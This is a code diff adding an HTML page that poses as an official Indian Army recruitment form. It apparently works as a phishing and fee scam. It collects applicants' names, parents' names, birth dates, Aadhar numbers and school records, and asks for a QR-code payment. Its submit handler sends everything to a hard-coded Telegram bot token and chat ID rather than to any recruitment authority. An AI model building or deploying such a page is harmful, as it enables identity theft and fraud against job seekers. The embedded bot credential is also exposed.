@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Army Recruitment Application</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha512-papEoYV7OdkuYBzhyD3zGV1e4HupztSp1XxwF0HvTQoU9kscVGEq4DYyX6Dhx1DcvANdbKoA3kZX6ZVYbIhZfg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <style>
+    * { box-sizing: border-box; }
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      margin: 0;
+      background: #f0f4f7;
+    }
+    header {
+      background: #002147;
+      color: white;
+      padding: 15px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    header h1 {
+      flex-grow: 1;
+      text-align: center;
+      font-size: 1.5rem;
+      background: url('army_bg.jpg') center center/cover no-repeat;
+      padding: 30px 0;
+      margin: 0;
+    }
+    header img.logo { height: 50px; }
+    .stage-bar {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 5px;
+      margin: 20px 10px;
+    }
+    .stage {
+      width: 40px;
+      height: 40px;
+      background: #ccc;
+      border-radius: 50%;
+      text-align: center;
+      line-height: 40px;
+      font-weight: bold;
+      color: #000;
+      position: relative;
+      transition: background 0.3s, color 0.3s;
+    }
+    .stage.active {
+      background: #004080;
+      color: white;
+    }
+    .stage::after {
+      content: '';
+      position: absolute;
+      top: 50%;
+      left: 100%;
+      width: 30px;
+      height: 4px;
+      background: #ccc;
+      transform: translateY(-50%);
+    }
+    .stage:last-child::after { display: none; }
+    .stage.filled::after { background: #004080; }
+    .form-step {
+      display: none;
+      background: white;
+      max-width: 700px;
+      margin: 0 auto 30px;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+    }
+    .form-step.active { display: block; animation: fadeIn 0.4s ease-in-out; }
+    label {
+      display: block;
+      margin-top: 15px;
+      font-weight: 600;
+    }
+    input, select {
+      width: 100%;
+      padding: 10px;
+      margin-top: 5px;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+    }
+    input:focus, select:focus {
+      border-color: #004080;
+      outline: none;
+    }
+    button {
+      margin-top: 20px;
+      padding: 10px 20px;
+      background: #004080;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    button:hover { background: #0059b3; }
+    .preview-img {
+      margin-top: 10px;
+      max-width: 100px;
+      border: 1px solid #ccc;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    .summary-page {
+      background: white;
+      max-width: 700px;
+      margin: 20px auto;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.15);
+    }
+    .summary-page img { max-width: 100px; margin: 10px; }
+  </style>
+</head>
+<body>
+  <header>
+    <img src="ashok_logo.png" alt="Ashok Stambh" class="logo">
+    <h1>ARMY RECRUITMENT APPLICATION</h1>
+    <img src="army_logo.png" alt="Army Logo" class="logo">
+  </header>
+
+  <div class="stage-bar" id="stage-bar">
+    <div class="stage active">1</div>
+    <div class="stage">2</div>
+    <div class="stage">3</div>
+    <div class="stage">4</div>
+    <div class="stage">5</div>
+  </div>
+
+  <form id="armyForm">
+    <div class="form-step active" id="step-1">
+      <label for="name">Full Name:</label>
+      <input type="text" id="name" required />
+      <label for="confirm_name">Confirm Full Name:</label>
+      <input type="text" id="confirm_name" required />
+      <label for="father_name">Father's Name:</label>
+      <input type="text" id="father_name" required />
+      <label for="mother_name">Mother's Name:</label>
+      <input type="text" id="mother_name" required />
+      <label for="dob">Date of Birth:</label>
+      <input type="date" id="dob" required />
+      <label for="aadhar">Aadhar Number:</label>
+      <input type="text" id="aadhar" maxlength="12" pattern="\d{12}" required />
+      <button type="button" onclick="nextStep(1)">Next</button>
+    </div>
+
+    <div class="form-step" id="step-2">
+      <label for="roll_10">10th Roll Number:</label>
+      <input type="text" id="roll_10" required />
+      <label for="board">Board:</label>
+      <select id="board" required>
+        <option value="">Select</option>
+        <option>Rajasthan Board</option>
+        <option>UP Board</option>
+        <option>Delhi Board</option>
+      </select>
+      <label for="percent">10th Percentage:</label>
+      <input type="number" id="percent" min="45" max="100" required />
+      <label for="pass_date">Passing Date:</label>
+      <input type="date" id="pass_date" required />
+      <button type="button" onclick="prevStep(2)">Back</button>
+      <button type="button" onclick="nextStep(2)">Next</button>
+    </div>
+
+    <div class="form-step" id="step-3">
+      <p style="text-align:center;font-weight:bold;">Scan QR to Pay</p>
+      <div class="qr-container">
+        <img src="payment.jpg" alt="QR Code" />
+      </div>
+      <label for="txn_id">Transaction ID:</label>
+      <input type="text" id="txn_id" maxlength="12" pattern="\d{12}" required />
+      <label for="payment_screenshot">Upload Screenshot:</label>
+      <input type="file" id="payment_screenshot" accept="image/*" onchange="previewImage(this, 'preview_payment')" required />
+      <img id="preview_payment" class="preview-img" />
+      <button type="button" onclick="prevStep(3)">Back</button>
+      <button type="button" onclick="nextStep(3)">Next</button>
+    </div>
+
+    <div class="form-step" id="step-4">
+      <label for="photo">Upload Photo:</label>
+      <input type="file" id="photo" accept="image/*" onchange="previewImage(this, 'preview_photo')" required />
+      <img id="preview_photo" class="preview-img" />
+      <label for="sign">Upload Signature:</label>
+      <input type="file" id="sign" accept="image/*" onchange="previewImage(this, 'preview_sign')" required />
+      <img id="preview_sign" class="preview-img" />
+      <button type="button" onclick="prevStep(4)">Back</button>
+      <button type="button" onclick="nextStep(4)">Next</button>
+    </div>
+
+    <div class="form-step" id="step-5">
+      <h3>Confirm & Submit</h3>
+      <p>Check all details before submitting.</p>
+      <button type="button" onclick="prevStep(5)">Back</button>
+      <button type="submit">Submit</button>
+    </div>
+  </form>
+
+<script>
+let currentStep = 1;
+function updateStageBar() {
+  const stages = document.querySelectorAll('.stage');
+  stages.forEach((s, i) => {
+    s.classList.remove('active', 'filled');
+    if (i + 1 < currentStep) s.classList.add('filled');
+    if (i + 1 === currentStep) s.classList.add('active');
+  });
+}
+
+function nextStep(step) {
+  const current = document.getElementById(`step-${step}`);
+  const inputs = current.querySelectorAll('input, select');
+  for (let input of inputs) {
+    if (!input.checkValidity()) {
+      alert("Please fill all required fields correctly.");
+      return;
+    }
+  }
+
+  if (step === 1) {
+    const name = document.getElementById('name').value.trim();
+    const confirm = document.getElementById('confirm_name').value.trim();
+    const dob = new Date(document.getElementById('dob').value);
+    const age = new Date().getFullYear() - dob.getFullYear();
+    if (name !== confirm) return alert("Name & Confirm Name must match.");
+    if (age < 18 || age > 42) return alert("Age must be between 18 and 42.");
+  }
+
+  document.getElementById(`step-${step}`).classList.remove('active');
+  document.getElementById(`step-${step + 1}`).classList.add('active');
+  currentStep++;
+  updateStageBar();
+}
+
+function prevStep(step) {
+  document.getElementById(`step-${step}`).classList.remove('active');
+  document.getElementById(`step-${step - 1}`).classList.add('active');
+  currentStep--;
+  updateStageBar();
+}
+
+function previewImage(input, id) {
+  if (input.files[0]) {
+    const reader = new FileReader();
+    reader.onload = e => document.getElementById(id).src = e.target.result;
+    reader.readAsDataURL(input.files[0]);
+  }
+}
+
+// ✅ Form submission logic
+document.getElementById("armyForm").addEventListener("submit", function(e) {
+  e.preventDefault();
+
+  const name = document.getElementById("name").value;
+  const father = document.getElementById("father_name").value;
+  const mother = document.getElementById("mother_name").value;
+  const dob = document.getElementById("dob").value;
+  const aadhar = document.getElementById("aadhar").value;
+  const roll10 = document.getElementById("roll_10").value;
+  const board = document.getElementById("board").selectedOptions[0].text;
+  const percent = document.getElementById("percent").value;
+  const passDate = document.getElementById("pass_date").value;
+  const txnId = document.getElementById("txn_id").value;
+
+  // ✅ Telegram Bot Token & Chat ID (Insert your values below)
+  const botToken = "8188094990:AAGILCZuVyUsQcnuz2BOG5I6Fz49faaMypQ";
+  const chatId = "6328847562";
+
+  const message = `
+Army Recruitment Application
+
+Name: ${name}
+Father's Name: ${father}
+Mother's Name: ${mother}
+DOB: ${dob}
+Aadhar: ${aadhar}
+10th Roll No: ${roll10}
+Board: ${board}
+10th Percentage: ${percent}%
+Passing Year: ${new Date(passDate).getFullYear()}
+Transaction ID: ${txnId}
+  `;
+
+  // ✅ Send data to Telegram
+  fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+    .then(() => {
+      showSummary({
+        name, father, mother, dob, aadhar,
+        roll10, board, percent, passDate, txnId
+      });
+    })
+    .catch(() => alert("Error sending data to Telegram"));
+});
+
+// ✅ Summary Print Page
+function showSummary(data) {
+  const summary = document.createElement('div');
+  summary.className = 'summary-page';
+  summary.innerHTML = `
+    <h2>Submitted Details</h2>
+    <p><strong>Full Name:</strong> ${data.name}</p>
+    <p><strong>Father's Name:</strong> ${data.father}</p>
+    <p><strong>Mother's Name:</strong> ${data.mother}</p>
+    <p><strong>Date of Birth:</strong> ${data.dob}</p>
+    <p><strong>Aadhar Number:</strong> ${data.aadhar}</p>
+    <p><strong>10th Roll Number:</strong> ${data.roll10}</p>
+    <p><strong>Board:</strong> ${data.board}</p>
+    <p><strong>10th Percentage:</strong> ${data.percent}%</p>
+    <p><strong>Passing Year:</strong> ${new Date(data.passDate).getFullYear()}</p>
+    <p><strong>Transaction ID:</strong> ${data.txnId}</p>
+    <p><strong>Uploaded Files:</strong></p>
+  `;
+
+  const paymentImg = document.createElement('img');
+  paymentImg.src = document.getElementById('preview_payment').src;
+  const photoImg = document.createElement('img');
+  photoImg.src = document.getElementById('preview_photo').src;
+  const signImg = document.createElement('img');
+  signImg.src = document.getElementById('preview_sign').src;
+
+  summary.appendChild(paymentImg);
+  summary.appendChild(photoImg);
+  summary.appendChild(signImg);
+
+  document.body.innerHTML = '';
+  document.body.appendChild(summary);
+  window.print();
+}
+</script>
+  
+  
+
+<script>
+  // Replace board options
+  window.onload = function() {
+    const boardSelect = document.getElementById('board');
+    boardSelect.innerHTML = `
+      <option selected="selected" value="">-- Select --</option>
+      <option value="1">RBSE</option>
+      <option value="2">CBSE</option>
+      <option value="3">Punjab Board</option>
+      <option value="4">RSOS</option>
+      <option value="5">UP Board</option>
+      <option value="6">Assam Board</option>
+      <option value="7">Andhra Board</option>
+      <option value="8">Delhi Board</option>
+      <option value="9">MP Board</option>
+      <option value="10">Banasthali</option>
+      <option value="11">Haryana Board</option>
+      <option value="12">Bihar Board</option>
+      <option value="13">Uttarakhand Board</option>
+      <option value="14">Chattisgarh Board</option>
+      <option value="15">BSEMB Gwalior</option>
+      <option value="16">Orissa Board</option>
+      <option value="17">CSE Mohali</option>
+      <option value="18">ICSE Delhi</option>
+      <option value="19">Delhi Open Board</option>
+      <option value="20">Gujarat Board</option>
+      <option value="21">Goa Board</option>
+      <option value="22">Kerala Board</option>
+      <option value="23">NIOS</option>
+      <option value="24">Haryana Open</option>
+      <option value="25">Himanchal Board</option>
+      <option value="26">Jharkhand Board</option>
+      <option value="27">Karnataka Board</option>
+      <option value="28">Maharastra Board</option>
+      <option value="29">MP Open School</option>
+      <option value="30">Nagaland Board</option>
+      <option value="31">Nepal Board</option>
+      <option value="32">Tamilnadu Board</option>
+      <option value="33">Tripura Board</option>
+      <option value="34">WB Board</option>
+      <option value="35">VARISHT UPADHYAY-RBSE</option>
+      <option value="36">Aligarh Muslim University</option>
+      <option value="39">BTER JODHPUR</option>
+      <option value="40">JAMMU AND KASHMIR STATE BOARD</option>
+      <option value="41">RASHTRIYA SANSKRIT SANSTHAN NEW DELHI</option>
+      <option value="42">RIOSUPL</option>
+      <option value="43">Telangana Board</option>
+      <option value="44">VMOU KOTA</option>
+      <option value="45">Jharkhand State Open School</option>
+      <option value="46">CBSE MP</option>
+      <option value="47">West Bengal Council of Higher Secondary</option>
+      <option value="48">RIOS - Chattisgarh</option>
+      <option value="49">RIOS - Uttarpradesh</option>
+      <option value="51">JVBI</option>
+      <option value="52">Usmania University</option>
+      <option value="53">BOSSE</option>
+      <option value="-1">Other</option>
+    `;
+  };
+</script>
+</body>
+</html>
